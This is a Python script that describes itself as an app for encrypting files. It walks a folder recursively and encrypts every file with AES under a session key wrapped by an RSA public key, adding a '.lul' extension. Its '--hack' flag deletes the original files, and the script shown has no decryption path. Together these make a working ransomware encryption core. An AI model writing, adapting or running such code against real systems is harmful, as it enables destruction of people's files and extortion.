import argparse
import os

from os.path import basename
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

MASK = ".lul"
PUBLIC_KEY = "public_key.pem"
PATH = "path"
FILE = "file"

def open_file(path_file, hack_mode):
    try:
        file_to_crypt = open(path_file, "rb")
    except:
        print("Can not open file: ", path_file)
    else:
        data = file_to_crypt.read()
        file_to_crypt.close()
        if (hack_mode == 1):
            os.remove(path_file)

        crypto_file(path_file, data)

def crypto_file(file_name, data):
    print('Source file: ', file_name, "--> ", file_name + MASK)
    with open(file_name + MASK, 'wb') as out_file:
        recipient_key = RSA.import_key(open(PUBLIC_KEY).read())
            
        session_key = get_random_bytes(16)
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)

        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)
        out_file.close()

def list_files_path(path_folder):
    list_files = []
    for top, dirs, files in os.walk(path_folder):
        for nm in files:       
            list_files.append(os.path.join(top, nm))

    return list_files

def crypto_operation(type, arg_parse, hack_mode):
    if (type == PATH):
        for file in list_files_path(arg_parse):
            open_file(file, hack_mode)

    if (type == FILE):
        open_file(arg_parse, hack_mode)

def args_parser(args):
    if (args.hack):
        hack_mode = 1
    else:
        hack_mode = 0

    if ((not args.p) and (not args.f)):
        print("Args is empty, try --help.")

    if args.p:
        crypto_operation(PATH, args.p, hack_mode)

    if args.f:
        crypto_operation(FILE, args.f, hack_mode)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='This is app for crypt files.')
    parser.add_argument('-p', type=str, help='Path to folder with files.')
    parser.add_argument('-f', type=str, help='Path to file.')
    parser.add_argument('--hack', action='store_true', help='Activate Hack mode :DDD (Source files will be deleted!)')
    args_parser(parser.parse_args())